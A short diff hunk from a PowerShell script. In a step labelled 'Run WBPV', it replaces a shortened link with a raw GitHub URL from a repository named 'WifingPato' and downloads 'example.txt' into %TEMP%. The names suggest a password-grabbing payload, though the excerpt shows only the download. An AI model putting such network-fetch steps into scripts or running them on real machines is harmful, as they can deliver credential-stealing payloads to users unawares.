@@ -249,7 +249,7 @@ for ($step = 1; $step -le $totalSteps; $step++) {
 
         1 {
             # Run WBPV 
-            $url = "https://lnkfwd.com/u/Kpj_Yric"  # Define the URL of the file to be downloaded
+            $url = "https://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/example.txt"  # Define the URL of the file to be downloaded
             $tempPath = [System.IO.Path]::Combine($env:TEMP, "example.txt")  # Define the path to save the file in the %temp% folder
             Invoke-WebRequest -Uri $url -OutFile $tempPath # Use Invoke-WebRequest to download the file
 
